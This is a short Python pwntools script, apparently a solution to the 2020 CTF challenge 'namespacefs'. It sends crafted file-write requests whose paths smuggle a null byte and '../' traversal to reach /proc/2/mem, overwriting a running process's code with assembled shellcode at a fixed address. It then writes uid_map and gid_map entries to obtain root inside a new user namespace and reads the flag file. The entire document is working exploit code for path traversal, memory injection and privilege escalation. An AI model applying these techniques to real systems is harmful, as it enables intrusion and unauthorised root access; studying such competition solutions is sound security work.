import nsfs_pb2 as nsfs
from time import sleep
from pwn import *

context.arch = "amd64"

CLONE_NEWUSER = 0x10000000

def send_write(io, path, data, offset=0):
    msg = nsfs.Operation(
        action=nsfs.WRITE,
        path=path,
        data=data,
        offset=offset).SerializeToString()
    io.send(p32(len(msg)) + msg)

if __name__ == "__main__":
    patch = asm(""
        + shellcraft.clone(CLONE_NEWUSER)
        + "test eax, eax\n"
        + "je child\n"
        + shellcraft.infloop()
        + "child:\n"
        + "push 0\n"
        + "push 3\n"
        + shellcraft.nanosleep("rsp")
        + shellcraft.setresuid(0, 0, 0)
        + shellcraft.cat("/home/user/flag")
    )
    io = remote("namespacefs.2020.ctfcompetition.com", 1337)
    send_write(io, "x\0/../../proc/2/mem", patch, 0x401b9b)
    sleep(1.5)
    send_write(io, "x\0/../../proc/4/uid_map", b"0 0 1\n")
    send_write(io, "x\0/../../proc/4/gid_map", b"0 0 1\n")
    io.interactive()
